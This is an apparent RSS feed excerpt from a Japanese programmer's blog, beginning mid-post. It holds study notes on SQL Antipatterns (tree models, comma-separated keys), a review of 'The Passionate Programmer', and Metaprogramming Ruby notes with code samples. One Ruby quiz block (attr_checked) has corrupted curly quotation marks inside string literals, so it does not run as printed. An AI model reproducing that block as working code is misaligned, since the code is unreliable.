&lt;p>ノードの削除が要らなかったり親と子だけ別れば良いときには使用しても問題ありません。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B2%C8%B7%CF%BF%DE">家系図&lt;/a>なんかは追加はしても削除はしないので、使用しても問題はないと思います。&lt;/p>
&lt;h3>解決策&lt;/h3>
&lt;p>他のツリーモデルを利用することです。本では3つの構造があげられています。&lt;/p>
&lt;h4>経路列挙&lt;/h4>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> parts_id &lt;/th>
&lt;th> parts_name &lt;/th>
&lt;th> parent_path &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a> &lt;/td>
&lt;td> &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 2 &lt;/td>
&lt;td> 一章 &lt;/td>
&lt;td> 1 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 3 &lt;/td>
&lt;td> 二章 &lt;/td>
&lt;td> 1 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 4 &lt;/td>
&lt;td> 一節 &lt;/td>
&lt;td> 1/2 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 5 &lt;/td>
&lt;td> 二節 &lt;/td>
&lt;td> 1/2 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 6 &lt;/td>
&lt;td> 一節 &lt;/td>
&lt;td> 1/3 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 7 &lt;/td>
&lt;td> 二節 &lt;/td>
&lt;td> 1/3 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 8 &lt;/td>
&lt;td> 一項 &lt;/td>
&lt;td> 1/3/6 &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/UNIX">UNIX&lt;/a>のパスと同じ形で上のツリーのノードを記録する構造です。
この構造のメリットは子ノードを簡単に取得できます。１/3/%といった形で一章の子ノードを階層がいくら深くても全て取得できます。&lt;/p>
&lt;h4>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C6%FE%A4%EC%BB%D2">入れ子&lt;/a>集合&lt;/h4>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> parts_id &lt;/th>
&lt;th> parts_name &lt;/th>
&lt;th> nsleft &lt;/th>
&lt;th> nsright &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a> &lt;/td>
&lt;td> 1 &lt;/td>
&lt;td> 16 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 2 &lt;/td>
&lt;td> 一章 &lt;/td>
&lt;td> 2 &lt;/td>
&lt;td> 7 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 3 &lt;/td>
&lt;td> 二章 &lt;/td>
&lt;td> 8 &lt;/td>
&lt;td> 15 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 4 &lt;/td>
&lt;td> 一節 &lt;/td>
&lt;td> 3 &lt;/td>
&lt;td> 4 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 5 &lt;/td>
&lt;td> 二節 &lt;/td>
&lt;td> 5 &lt;/td>
&lt;td> 6 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 6 &lt;/td>
&lt;td> 一節 &lt;/td>
&lt;td> 9 &lt;/td>
&lt;td> 12 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 7 &lt;/td>
&lt;td> 二節 &lt;/td>
&lt;td> 13 &lt;/td>
&lt;td> 14 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 8 &lt;/td>
&lt;td> 一項 &lt;/td>
&lt;td> 10 &lt;/td>
&lt;td> 11 &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>子孫の集合に関する情報をそれぞれの行に入れています。&lt;br>
nsleftには下のノード全ての値より小さい値、nsrightには逆に下のノード全ての値より大きい値が入っています。&lt;br>
ノードAの下のノードを全て特定したいときはAの子ノードの範囲内にnsleftが入っているノードを検索することで達成できます。逆にAの上のノードを全て検索したいときはAのnsleftを範囲内に持つノードを検索することで取得できます。&lt;br>
またあるノードを削除しても子ノードや親ノードを検索することに不都合はなく、削除されたノードの子ノードは親の親ノードの子であるとみなされるので削除も容易です。&lt;br>
しかしノードの挿入や移動は他の構造より複雑になります、全てのノードが親だけに依存しているわけではないので移動するといちいち値の計算のし直しです。&lt;/p>
&lt;h4>閉包テーブル&lt;/h4>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> parant_id &lt;/th>
&lt;th> child_id &lt;/th>
&lt;th> parant_id &lt;/th>
&lt;th> child_id &lt;/th>
&lt;th> parant_id &lt;/th>
&lt;th> child_id &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> 1 &lt;/td>
&lt;td> 2 &lt;/td>
&lt;td> 2 &lt;/td>
&lt;td> 5 &lt;/td>
&lt;td> 5 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> 2 &lt;/td>
&lt;td> 2 &lt;/td>
&lt;td> 4 &lt;/td>
&lt;td> 6 &lt;/td>
&lt;td> 6 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> 3 &lt;/td>
&lt;td> 2 &lt;/td>
&lt;td> 5 &lt;/td>
&lt;td> 6 &lt;/td>
&lt;td> 8 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> 4 &lt;/td>
&lt;td> 3 &lt;/td>
&lt;td> 3 &lt;/td>
&lt;td> 7 &lt;/td>
&lt;td> 7 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> 5 &lt;/td>
&lt;td> 3 &lt;/td>
&lt;td> 6 &lt;/td>
&lt;td> 8 &lt;/td>
&lt;td> 8 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> 6 &lt;/td>
&lt;td> 3 &lt;/td>
&lt;td> 7 &lt;/td>
&lt;td> &lt;/td>
&lt;td> &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> 7 &lt;/td>
&lt;td> 3 &lt;/td>
&lt;td> 8 &lt;/td>
&lt;td> &lt;/td>
&lt;td> &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> 8 &lt;/td>
&lt;td> 4 &lt;/td>
&lt;td> 4 &lt;/td>
&lt;td> &lt;/td>
&lt;td> &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>テーブルの親と子の組み合わせを深さに関係なく全て格納するテーブルを作成する構造です。ノード自身を参照する組み合わせも格納します。前回の関係のためだけの中間テーブルに似ている気もします。&lt;br>
下のノード全てを検索するのは簡単でparant_idが4の組み合わせを取り出して元のテーブルをjoinすればいいです。先祖もchild_idから特定できます。&lt;br>
一ノードを追加するとその親とその上のノード全てを取得して新しいノードをchild_idとして登録することになります。削除では削除したいノードをchild_id持つ行を全て削除することになります。全て削除とかは機械は得意なのでいいですね。&lt;br>
もちろん閉包テーブルを削除しても章の情報は残ったままです。これはノードの関連付けを柔軟にできることにも繋がります。&lt;/p>
&lt;h4>どの設計を使うべきか&lt;/h4>
&lt;p>それぞれメリット・デメリットあります。&lt;/p>
&lt;ul>
&lt;li>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>として挙げられた親ノードだけ持つ隣接リストは、下のノードがすぐわかればいい、削除等は基本行わないという用途に適していると思います。上記にも書きましたが家計なんかでしょうか。&lt;/li>
&lt;li>親ノードまでの階層の道&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A4%CE%A4%EA%A4%F2">のりを&lt;/a>全て持つ経路列挙は、道のりに変なものが入らない保証はできない、階層の深さに制限がかかる、といったデメリットがあります。住所なんかは&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D1%A5%F3%A4%AF%A4%BA%A5%EA%A5%B9%A5%C8">パンくずリスト&lt;/a>から一気に参照したいことが多いでしょうし適していると思います。&lt;/li>
&lt;li>子ノードの範囲を行に入れる&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C6%FE%A4%EC%BB%D2">入れ子&lt;/a>集合は、削除はできますが挿入がしにくいです。ツリー構造の中のツリーを検索することが容易なので、本の分類なんか適していると思います。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%BC%D2%B2%F1%B3%D8">社会学&lt;/a>とか数学とか分類は決まっていて、数学のツリーを見たいといった操作に適していると思うからです。&lt;/li>
&lt;li>子ノード及びその下のノード全ての関係を別テーブルに保存しておく閉包テーブルは、検索や削除、挿入容易ですし、外部キー制約が使えるので整合性も良いですが、別のテーブルを使う、行数そのものは多くなるという欠点が生じます。これは用途というよりスペックの問題な気がします。&lt;/li>
&lt;/ul>
&lt;p>感想
この章はだいぶ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>を感じました。&lt;br>
調べる中で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>の学習らしき論文っぽいものが多くでてきて、「これが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>を学ぶことなのか」と感じました。実際&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>でも最後にアカデミックな資料をおすすめされています。&lt;br>
階層に対するクエリの実行だとかはデータベースとビューをつなぐ役割を持つバックエンドとしては必須の知識感ありますね（まだ全くないんですが…）
ここ理解違うんじゃない？みたいなのがあれば是非お願いします！&lt;/p>
&lt;/body></description></item><item><title>SQLアンチパターン　第一章を読んで</title><link>https://qwyng.dev/posts/2019/02/14/232529/</link><pubDate>Thu, 14 Feb 2019 23:25:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/02/14/232529/</guid><description>&lt;body>
&lt;h3>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>のテーブル例&lt;/h3>
&lt;p>Books&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> book_id &lt;/th>
&lt;th> book_name &lt;/th>
&lt;th> tag_id &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>-anti-pattern &lt;/td>
&lt;td> 1, 2 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 2 &lt;/td>
&lt;td> Readable Code &lt;/td>
&lt;td> 2 &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>Tags&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> tag_id &lt;/th>
&lt;th> tag_name &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a> &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 2 &lt;/td>
&lt;td> O'Reilly &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>このテーブルの関係では、本はタグを複数持っていてタグは複数の本につけられています。この多対多の関係を、中間の関係を示すテーブルなしで外部キー、つまりtag_idを一つのフィールドにカンマ区切りで格納しています。&lt;br>
これが今回の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>「信号無視」です。&lt;/p>
&lt;h3>デメリット&lt;/h3>
&lt;ol>
&lt;li>&lt;p>特定のタグをもつ本を探したくてもtag_id = 1 のような形で探せないため、1があるかを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C0%B5%B5%AC%C9%BD%B8%BD">正規表現&lt;/a>なんかでパターンマッチする必要があります。これだと式の組み方を間違えてしまう可能性も高く、そもそも式の組み方が&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/MySQL">MySQL&lt;/a>や&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/PostgreSQL">PostgreSQL&lt;/a>等&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDBMS">RDBMS&lt;/a>で違ってきます。&lt;/p>&lt;/li>
&lt;li>&lt;p>特定の本についているタグを結合したくても、その本のtag_idフィールドでパターンマッチしなくてはならないので効率的ではありません。&lt;/p>&lt;/li>
&lt;li>&lt;p>集約クエリ（COUNT等）は複数の行に対して行うように設計されているので、例えば本についているタグの数を数えたい時なんかにそのまま使用ができません。&lt;/p>&lt;/li>
&lt;li>&lt;p>tag_idをカンマ区切りのリストの末尾に追加するのは必ずしも番号順ではないためソート順が維持できなくなるかもしれません。一つタグを削除するのも古いtag_idをまるごと捨ててと新しいtag_idをまるっと入れねばなりません。&lt;/p>&lt;/li>
&lt;li>&lt;p>tag_idにはVARCHARで文字列なら何でも入れられます。危険です。&lt;/p>&lt;/li>
&lt;li>&lt;p>リストの長さがVARCHAR(30)等で簡単に限られてしまいます。&lt;/p>&lt;/li>
&lt;/ol>
&lt;h3>使ってもいい場合&lt;/h3>
&lt;p>なにかで区切られたデータが必要で、かつその個別の要素にアクセスが不要な場合はこの方法を用いても良い場合に挙げられています。&lt;br>
少しそんな場合を考えたのですが、多対多でそんなケースありえるんでしようか？　思いつきませんでした。&lt;/p>
&lt;h3>解決方&lt;/h3>
&lt;p>交差テーブルを作成する。いわく中間テーブルってやつですね。&lt;br>
BookTaggingsテーブルとかでしょうか。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> book_id &lt;/th>
&lt;th> tag_id &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> 1 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> 2 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 2 &lt;/td>
&lt;td> 2 &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>こうすることでデメリットを以下のように解決できます。&lt;/p>
&lt;ul>
&lt;li>&lt;p>1及び2&lt;br>
特定の本のタグを検索するときにはTagsテーブルを結合してbook_idで絞り込めばいいですし、その逆もしかりです。インデックスを有効に使えます。&lt;/p>&lt;/li>
&lt;li>&lt;p>3&lt;br>
行が別になっているので、例えば本についているタグの数を数えたい時はbook_idでGROUP BYしてそのまま数えることができます。&lt;/p>&lt;/li>
&lt;li>&lt;p>4&lt;br>
BookTaggingsテーブルに行を挿入、もしくは行を削除すればいいだけです。&lt;/p>&lt;/li>
&lt;li>&lt;p>5&lt;br>
フィールドの内容が同一なので、BookTaggingsテーブルのbook_idカラムにはBooksテーブルのbook_idしか入れられないという外部キー制約をかけることができます。&lt;/p>&lt;/li>
&lt;li>&lt;p>6&lt;br>
一つのテーブルに格納できる行数以外の制約はもうありません！&lt;/p>&lt;/li>
&lt;/ul>
&lt;h3>感想&lt;/h3>
&lt;p>中間テーブルって何で必要なんだろう？という疑問を&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>の視点から答えてくれる章でした。中間テーブル、大事です。まだ業務では作ったことないですが。&lt;/p>
&lt;/body></description></item><item><title>情熱プログラマーを読んで</title><link>https://qwyng.dev/posts/2019/02/11/184124/</link><pubDate>Mon, 11 Feb 2019 18:41:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/02/11/184124/</guid><description>&lt;body>
&lt;h3>はじめに&lt;/h3>
&lt;p>僕が好きな&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Vtuber">Vtuber&lt;/a>できりみんちゃんさんという方がいます。小学生です。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fkirimin.hatenablog.com%2Fentry%2F2019%2F02%2F09%2F225600" title="最近話題のきりみんちゃんって何者？小学生でプログラマーって本当？労働基準法は！？調べてみました - みんからきりまで" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://kirimin.hatenablog.com/entry/2019/02/09/225600">kirimin.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>話し方から伝わる人柄の良さとか努力の過程を公開している感じが好きです。この方が動画でおすすめしていた本が&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/4274067939/cevidcpp-22/">情熱プログラマー&lt;/a>という本です。
エンジニアとしてのあるべき姿勢とそこにたどり着く具体的なアクションについて書かれています。&lt;br>
ただ自分は職業エンジニアになってからまだ一週間なので、実感できない部分もありました、なので全ての感想というよりは、少ないですが自分の中で納得感の大きかったトピックの感想を書いていきます。&lt;/p>
&lt;h3>一番の下手くそでいよう&lt;/h3>
&lt;p>このトピックでおすすめされているアクションに転職等がすぐに難しい人向けの具体的な方法に、優秀そうな人の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>を読んで周りのコードを真似しながらなにかコードを書いてみようというものがありました。&lt;br>
自分が一番下手くそな状況というのは、自分以外に優れている誰かがいないと成立しない状況なので、実際に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>で公開されている自分より経験のある人が書いたコードの中でコーディングするのは、転職等よりも遥かに敷居低く自分を一番下手くそにできると思います。 &lt;br>
自分ひとりだけで自分が一番下手くそな状況というのはありえないので、独学でもこの姿勢は大事にしていきたいですね。本を読むのもこれが理由だと思います。語学とか他の勉強でも使えそう。&lt;br>
現職も間違いなく自分が一番下手くそなので、恵まれていると思っています。&lt;/p>
&lt;h3>新しい言語を学ぶ&lt;/h3>
&lt;p>自分の知性に投資しようというトピックにあった具体的なアクションです。&lt;br>
勉強するというより面白そうだからやるっていう言語のほうが良いみたいですね。&lt;br>
自分はKotlinに手を出しています。アプリをつくりたいという欲求と、今の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A5%DE%A5%DB">スマホ&lt;/a>のOSが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Android">Android&lt;/a>なことと、きりみんちゃんが推してるのが理由です。とりあえずKotlinスタートブックを買ってみました。&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>ぐらいしかある程度時間を投資した言語がないので、そもそも静的型付け言語みてもよくわからないという悲しさが現在あります。その解消にもなるかも。&lt;br>
よく&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A5%DE%A5%DB">スマホ&lt;/a>みたまま寝落ちして睡眠時間がよくわからない感じになるので、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A5%DE%A5%DB">スマホ&lt;/a>の画面つけている時間とつけてない時間記録して寝ている時間を計測してまとめてくれるアプリ欲しい‥&lt;/p>
&lt;h3>あわてるな&lt;/h3>
&lt;p>パニック日記！この発想はなかったです。&lt;br>
私は自覚があるくらいにはよくパニックになると思っているのですが、振り返ると、人に評価されている、値踏みされていると感じる時が一番パニックになっていると思います。悪い評価になるのが怖いし自分をできるだけよく見せたいからです。&lt;br>
このパニックをより細かく噛み砕けたら良さそう。カレンダーに早速スケジュールを追加してみました。&lt;/p>
&lt;h2>一年後はまた別の感想になりそう&lt;/h2>
&lt;p>開発者として使命を持つ、とかビジネスを知る、といったトピックはまだピンと来なかったです。&lt;br>
自分が開発者として少し経験を積んだらまた違った感想を持つと思うので、時間立ってから読み返したいと思った一冊でした。ベターエンジニアを日々目指していきたひ。&lt;/p>
&lt;/body></description></item><item><title>メタプログラミングRuby 6章コードを記述するコード</title><link>https://qwyng.dev/posts/2019/02/06/000906/</link><pubDate>Wed, 06 Feb 2019 00:09:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/02/06/000906/</guid><description>&lt;body>
&lt;h2>eval(string)&lt;/h2>
&lt;p>evalメソッドに文字列を渡すと実行してくれます。&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/irb">irb&lt;/a>もevalで実行されています。&lt;br>
式展開してメソッドを定義したいときなんかに便利。&lt;br>
しかし文字列をコードとして実行してしまうということはコードインジェクションに弱くなってしまうので、evalには自分で設定するもの以外は渡さないほうが無難です。&lt;/p>
&lt;p>手順４のクイズ&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> require ‘test/unit’
module AttrCheckedModule
def attr_checked(*attribute*, &amp;amp;*validation*)
define_method(“#{attribute}=") do |value|
raise 'Invalid attribute' unless yield(value)
instance_variable_set("@“{attribute}",”value)
end
define_method("“{attribute}") do
instance_variable_get("@#{“ttribute}")
” end
end
end
class Person
extend AttrCheckedModule
attr_checked :age do |v|
v &amp;gt;= 18
end
end
class TestAdd &amp;lt; Test::Unit::TestCase
def setup
@bob = Person.new
end
def test_accepts_valid_values
@bob.age = 20
assert_equal 20, @bob.age
end
def test_accepts_invalid_values
assert_raises RuntimeError, ‘Invalid attribute’ do’
@bob.age = 17
end
end
end
&lt;/pre>
&lt;p>書のようにClassクラスの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>メソッドとして定義してもいいですが、少し汚し過ぎかなと思うのでextendでクラスメソッドにしてみました。&lt;/p>
&lt;h2>フックメソッド&lt;/h2>
&lt;p>クラスの継承やモジュールのインクルードのイベントが起きた時に、それをキャッチしてメソッドを実行することができます。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class String
def self.inherited(*subclass*)
puts “#{self}は#{subclass}に継承された"
end
end
class Mystring &amp;lt; String; end # -&amp;gt; StringはMystringに継承された
&lt;/pre>
&lt;p>モジュールをミックスインした時やメソッドを作ったときなんかもフックできます。&lt;/p>
&lt;p>クイズで&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> module CheckedAttribute
def self.included(klass)
klass.class_eval do
extend CheckedAttributeMethod
end
end
&lt;/pre>
&lt;p>と書きましたが、extendはクラスメソッドなのだからそのまま実行させればよかったですね。&lt;/p>
&lt;h2>７章読んでのポエム&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E1%A5%BF%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">メタプログラミング&lt;/a>というものは存在しない&lt;/p>
&lt;p>全てはただのプログラミングじゃ。&lt;/p>
&lt;/blockquote>
&lt;p>まだ自分は悟りを開けてはいない。しかしこの本を読んでいなかったら読めないコードは確かに存在したので、忘れられるほどは賢くないのだろう。&lt;/p>
&lt;/body></description></item><item><title>メタプログラミングRuby ５章　クラス定義</title><link>https://qwyng.dev/posts/2019/01/26/160835/</link><pubDate>Sat, 26 Jan 2019 16:08:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/01/26/160835/</guid><description>&lt;body>
&lt;ul class="table-of-contents">
&lt;li>
&lt;a href="#%E7%89%B9%E7%95%B0%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89">特異メソッド&lt;/a>&lt;ul>
&lt;li>&lt;a href="#%E3%82%AB%E3%83%AC%E3%83%B3%E3%83%88%E3%82%AF%E3%83%A9%E3%82%B9">カレントクラス&lt;/a>&lt;/li>
&lt;li>&lt;a href="#%E3%82%AF%E3%83%A9%E3%82%B9%E3%82%A4%E3%83%B3%E3%82%B9%E3%82%BF%E3%83%B3%E3%82%B9%E5%A4%89%E6%95%B0">クラスインスタンス変数&lt;/a>&lt;/li>
&lt;li>&lt;a href="#%E7%89%B9%E7%95%B0%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89-1">特異メソッド&lt;/a>&lt;/li>
&lt;li>&lt;a href="#%E3%82%AF%E3%83%A9%E3%82%B9%E3%83%9E%E3%82%AF%E3%83%AD">クラスマクロ&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;a href="#%E7%89%B9%E7%95%B0%E3%82%AF%E3%83%A9%E3%82%B9">特異クラス&lt;/a>&lt;ul>
&lt;li>&lt;a href="#%E5%A4%A7%E7%B5%B1%E4%B8%80%E7%90%86%E8%AB%96">大統一理論&lt;/a>&lt;/li>
&lt;li>&lt;a href="#Objectextend">Object#extend&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;a href="#%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%83%A9%E3%83%83%E3%83%91%E3%83%BC">メソッドラッパー&lt;/a>&lt;ul>
&lt;li>&lt;a href="#%E3%82%A2%E3%83%A9%E3%82%A6%E3%83%B3%E3%83%89%E3%82%A8%E3%82%A4%E3%83%AA%E3%82%A2%E3%82%B9">アラウンドエイリアス&lt;/a>&lt;/li>
&lt;li>&lt;a href="#Refinements">Refinements&lt;/a>&lt;/li>
&lt;li>&lt;a href="#Prepend%E3%83%A9%E3%83%83%E3%83%91%E3%83%BC">Prependラッパー&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#%EF%BC%95%E7%AB%A0%E3%81%AE%E3%82%AF%E3%82%A4%E3%82%BA">５章のクイズ&lt;/a>&lt;/li>
&lt;li>&lt;a href="#%E3%81%BE%E3%81%A8%E3%82%81">まとめ&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="特異メソッド">特異メソッド&lt;/h2>
&lt;h3 id="カレントクラス">カレントクラス&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>のプログラムは常にカレントオブジェクトselfを持っているが、同時にカレントクラスも持っています。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class C
def m1
p self
def m2; end
end
end
class D &amp;lt; C; end
obj = D.new
obj.m1 # =&amp;gt; &amp;lt;D:0x00007fc1e2865938&amp;gt;
p C.instance_methods(false) # =&amp;gt;[:m1, :m2]
p D.instance_methods(false) # =&amp;gt; []
&lt;/pre>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E1%A5%BF%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">メタプログラミング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>のサンプルに少し書き足してみました。
カレントオブジェクトはDクラスの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>ですが、カレントクラスはCクラスであることがわかりますね。よってm2はCクラスの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>メソッドになっています。&lt;/p>
&lt;p>Classでクラスを開くことでカレントクラスを変えることができるのですが、この方法はカレントクラスにしたいクラスの名前がわからないと使えません。クラス名がわからない時に使うのが class_evalメソッドです。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def add_method_to(a_class)
a_class.class_eval do
def m
'Hello!'
end
end
end
add_method_to(String)
p "string".m # =&amp;gt; 'Hello!'
&lt;/pre>
&lt;p>このadd_method_toメソッドではクラスを引数にとってclass_evalを使うことで引数にとったクラスにカレントクラスを変更してからメソッドを定義しています。
class_evalは第四章のinstance_evalとは別物です。
instance_evalはselfを変更してブロック内を評価してくれるものでしたが、class_evalはselfに加えてカレントクラスも変更します。
スコープゲートを開いているわけではないのでスコープは変わりません。&lt;/p>
&lt;h3 id="クラスインスタンス変数">クラス&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>変数&lt;/h3>
&lt;p>クラスの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>変数とクラスのオブジェクトの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>変数は別物です。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class Myclass
@my_var = 1
def self.read
@my_var
end
def write
@my_var = 2
end
def read
@my_var
end
end
obj = Myclass.new
p obj.read # =&amp;gt; nil
